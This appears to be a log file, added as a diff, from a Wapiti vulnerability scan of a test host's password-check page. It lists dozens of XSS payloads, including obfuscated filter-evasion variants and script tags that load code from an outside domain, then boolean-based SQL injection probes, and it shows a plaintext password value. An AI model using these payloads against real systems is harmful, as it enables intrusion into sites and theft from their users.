@@ -1,0 +1,208 @@
+2024-03-20 14:25:34.735 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/passcheck.php (0)
+	data: password=fuzz
+2024-03-20 14:25:34.838 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/passcheck.php (1)
+	data: password=Letm3in_
+2024-03-20 14:25:34.838 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:34.943 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 14:25:34.944 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_8880a3c9.db
+2024-03-20 14:25:34.949 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 14:25:34.980 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 14:25:34.980 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 14:25:34.983 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 14:25:35.086 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 14:25:35.086 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 14:25:35.101 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:35.112 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (0)
+	data: password=fuzz
+2024-03-20 14:25:35.136 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%3Ealert%28%27w2fpeuo0tx%27%29%3C%2FsCrIpT%3E
+2024-03-20 14:25:35.155 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%3Ealert%28%22w2fpeuo0tx%22%29%3C%2FsCrIpT%3E
+2024-03-20 14:25:35.173 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%3Ealert%28%2Fw2fpeuo0tx%2F%29%3C%2FsCrIpT%3E
+2024-03-20 14:25:35.194 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CSvG%2FoNloAd%3Dalert%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.209 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CSvG%2FoNloAd%3Dalert%28%2Fw2fpeuo0tx%2F%29%2F%2F
+2024-03-20 14:25:35.224 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CSvG%0AoNloAd%3Dalert%28%27w2fpeuo0tx%27%29%3E
+2024-03-20 14:25:35.242 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScript%20src%3Dhttps%3A%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%3E%3C%2FScript%3E
+2024-03-20 14:25:35.258 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%20src%3D%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%3E%3C%2FScRiPt%3E
+2024-03-20 14:25:35.275 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%3E%28alert%29%28%2Fw2fpeuo0tx%2F%29%3B%3C%2FScRiPt%3E
+2024-03-20 14:25:35.290 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CImG%20src%3Dz%20oNeRror%3Dalert%28%22w2fpeuo0tx%22%29%3E
+2024-03-20 14:25:35.312 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CImG%20src%3Dz%20oNeRror%3Dalert%28%27w2fpeuo0tx%27%29%3E
+2024-03-20 14:25:35.329 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CImG%20src%3Dz%20oNeRror%3Dalert%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.348 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cobject%20data%3D%22javascript%3Aalert%28%27w2fpeuo0tx%27%29%22%3E
+2024-03-20 14:25:35.366 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cobject%20data%3D%22JaVasCript%3Aalert%28%27w2fpeuo0tx%27%29%22%3E
+2024-03-20 14:25:35.385 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cobject%20data%3D%27JaVasCript%3Aalert%28%22w2fpeuo0tx%22%29%27%3E
+2024-03-20 14:25:35.403 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CiFrAme%20src%3D%22jAvasCript%3Aalert%28%2Fw2fpeuo0tx%2F%29%3B%22%3E%3C%2Fiframe%3E
+2024-03-20 14:25:35.423 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cdetails%20open%20ontoggle%3Dconfirm%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.438 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cbody%2FoNpagEshoW%3D%28confirm%29%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.456 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Ca%0Aautofocus%0Aonfocus%3D%27%28function%28%29%7Breturn%20window%7D%29%28%29%5B%22alert%22%5D%28%22w2fpeuo0tx%22%29%27%0Ahref%3E
+2024-03-20 14:25:35.476 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cframe%20src%3D%22javascript%3Aalert%28%2Fw2fpeuo0tx%2F%29%22%2F%3E
+2024-03-20 14:25:35.497 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cmarquee%20loop%3D1%20width%3D0%20onfinish%3Dprompt%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.518 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3E%3Csvg%3E%3Canimate%20onbegin%3Dprompt%28%2Fw2fpeuo0tx%2F%29%20attributeName%3Du%20dur%3D1s%3E
+2024-03-20 14:25:35.537 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%2Fsrc%3Dhttps%3A%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%3E%3C%2FsCrIpT%2F%3E
+2024-03-20 14:25:35.556 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%09src%3Dhttps%3A%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%3E%3C%2FsCrIpT%3E
+2024-03-20 14:25:35.575 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CImG%09src%3Dz%09oNeRror%3Dalert%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.589 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=0%5BFF%5D%3CsCripT%5BFF%5D%3Ealert%28%2Fw2fpeuo0tx%2F%29%3C%2FsCripT%5BFF%5D%3E%5BFF%5D0
+2024-03-20 14:25:35.606 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScRiPt%09%3Ealert%28%2Fw2fpeuo0tx%2F%29%3C%2FsCrIpT%09%3E
+2024-03-20 14:25:35.624 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cobject%09data%3DjavAscripT%3Aalert%28%2Fw2fpeuo0tx%2F%29%3E
+2024-03-20 14:25:35.645 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cscr%3Cscript%3Eipt%3E%28alert%29%28%2Fw2fpeuo0tx%2F%29%2F%2F%3C%2Fscr%3C%2Fscript%3Eipt%3E
+2024-03-20 14:25:35.665 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cscr%3Cscript%3Eipt%20src%3Dhttps%3A%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%3E%3C%2Fscript%3E
+2024-03-20 14:25:35.687 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cscr%3Cscript%3Eipt%20src%3Dhttps%3A%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%3E%3C%2Fscr%3C%2Fscript%3Eipt%3E
+2024-03-20 14:25:35.708 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cimg%20src%20onerror%3D%26emsp%3Bprompt%60%24%7B%2Fw2fpeuo0tx%2F%7D%60%3E
+2024-03-20 14:25:35.733 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CsCrIpt%3E%3C%21--%0Aconfirm%28%2Fw2fpeuo0tx%2F%29%2F%2F--%3E%3C%2FsCrIpt%3E
+2024-03-20 14:25:35.753 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3CScript%20e%3D%22%3E%22%20src%3D%22https%3A%2F%2Fw4lj8m.com%2Fw2fpeuo0txz.js%22%3E%3C%2FScript%3E
+2024-03-20 14:25:35.777 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cimg%20src%3Dk%20onerror%3Dprompt%60w2fpeuo0tx%60%3E
+2024-03-20 14:25:35.801 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Csvg%20onload%3D%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27w2fpeuo0tx%26%23x27%26%23x29%3E
+2024-03-20 14:25:35.826 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cinput%20autofocus%20onfocus%20%3Dtop%5B%28584390752%2A16%29.toString%2832-1%2A2%29%5D%28%2Fw2fpeuo0tx_%2F%29%3E
+2024-03-20 14:25:35.850 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cscript%3E%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29%28%29%3C%2Fscript%3E
+2024-03-20 14:25:35.875 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Ccustom%0Achecked%0Aonpointerenter%3D%22x%3D%27pr%27%2Cy%3Dtop%3Bx%2B%3D%27ompt%27%3By%5Bx%5D%28%27w2fpeuo0tx%27%29%22style%3D%22position%3Aabsolute%3Btop%3A0%3Bheight%3A2000px%3Bbackground-color%3Ared%3Bwidth%3A2000px%3Bleft%3A0%3Bz-index%3A9998%3B%22%3EXSS%3C%2Fcustom%0Atags%3E
+2024-03-20 14:25:35.895 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] POST http://web/passcheck.php (0)
+	data: password=%3Cdiv%20id%3D%22w2fpeuo0tx%22%3Eyolo%3C%2Fdiv%3E
+2024-03-20 14:25:35.927 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (1)
+	data: password=Letm3in_
+2024-03-20 14:25:35.941 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 14:25:35.987 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 14:25:36.005 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:36.011 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 14:25:36.012 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 14:25:36.058 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 14:25:36.058 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 14:25:36.131 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 14:25:36.144 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/passcheck.php (1)
+2024-03-20 14:25:36.166 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (0)
+	data: password=fuzz
+2024-03-20 14:25:36.166 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%C2%BF%27%22%28
+2024-03-20 14:25:36.201 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%20AND%2023%3D107%20AND%2053%3D53
+2024-03-20 14:25:36.218 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%20AND%2021%3D109%20AND%2022%3D22
+2024-03-20 14:25:36.235 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%20AND%2070%3D70%20AND%2046%3D46
+2024-03-20 14:25:36.254 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%27%20AND%2033%3D59%20AND%20%2796%27%3D%2796
+2024-03-20 14:25:36.270 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%27%20AND%2090%3D165%20AND%20%2789%27%3D%2789
+2024-03-20 14:25:36.289 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%27%20AND%2055%3D55%20AND%20%2720%27%3D%2720
+2024-03-20 14:25:36.308 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%22%20AND%2031%3D126%20AND%20%2238%22%3D%2238
+2024-03-20 14:25:36.332 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%22%20AND%2085%3D142%20AND%20%2286%22%3D%2286
+2024-03-20 14:25:36.355 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%22%20AND%2063%3D63%20AND%20%2274%22%3D%2274
+2024-03-20 14:25:36.375 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%29%20AND%2058%3D133%20AND%20%2830%3D30
+2024-03-20 14:25:36.398 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%29%20AND%2082%3D102%20AND%20%2873%3D73
+2024-03-20 14:25:36.420 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%29%20AND%2048%3D48%20AND%20%2831%3D31
+2024-03-20 14:25:36.440 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%27%29%20AND%2028%3D41%20AND%20%28%2776%27%3D%2776
+2024-03-20 14:25:36.464 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%27%29%20AND%2087%3D114%20AND%20%28%2713%27%3D%2713
+2024-03-20 14:25:36.488 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%27%29%20AND%2064%3D64%20AND%20%28%2763%27%3D%2763
+2024-03-20 14:25:36.511 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%22%29%20AND%2041%3D117%20AND%20%28%2216%22%3D%2216
+2024-03-20 14:25:36.536 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%22%29%20AND%2054%3D144%20AND%20%28%2211%22%3D%2211
+2024-03-20 14:25:36.560 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (0)
+	data: password=fuzz%22%29%20AND%2041%3D41%20AND%20%28%2293%22%3D%2293
+2024-03-20 14:25:36.594 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/passcheck.php (1)
+	data: password=Letm3in_
+2024-03-20 14:25:36.614 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%20AND%2077%3D143%20AND%2024%3D24
+2024-03-20 14:25:36.637 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%20AND%2047%3D90%20AND%2022%3D22
+2024-03-20 14:25:36.657 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%20AND%2062%3D62%20AND%2046%3D46
+2024-03-20 14:25:36.679 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%27%20AND%2096%3D125%20AND%20%2780%27%3D%2780
+2024-03-20 14:25:36.703 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%27%20AND%2012%3D80%20AND%20%2788%27%3D%2788
+2024-03-20 14:25:36.724 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%27%20AND%2047%3D47%20AND%20%2735%27%3D%2735
+2024-03-20 14:25:36.749 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%22%20AND%2073%3D148%20AND%20%2240%22%3D%2240
+2024-03-20 14:25:36.773 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%22%20AND%2044%3D87%20AND%20%2253%22%3D%2253
+2024-03-20 14:25:36.793 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%22%20AND%2023%3D23%20AND%20%2213%22%3D%2213
+2024-03-20 14:25:36.818 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%29%20AND%2095%3D161%20AND%20%2841%3D41
+2024-03-20 14:25:36.840 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%29%20AND%2087%3D154%20AND%20%2876%3D76
+2024-03-20 14:25:36.861 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%29%20AND%2062%3D62%20AND%20%2822%3D22
+2024-03-20 14:25:36.881 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%27%29%20AND%2046%3D96%20AND%20%28%2735%27%3D%2735
+2024-03-20 14:25:36.903 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%27%29%20AND%2067%3D90%20AND%20%28%2711%27%3D%2711
+2024-03-20 14:25:36.927 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%27%29%20AND%2040%3D40%20AND%20%28%2741%27%3D%2741
+2024-03-20 14:25:36.953 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%22%29%20AND%2079%3D101%20AND%20%28%2286%22%3D%2286
+2024-03-20 14:25:36.982 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/passcheck.php (1)
+	data: password=Letm3in_%22%29%20AND%2072%3D142%20AND%20%28%2262%22%3D%2262
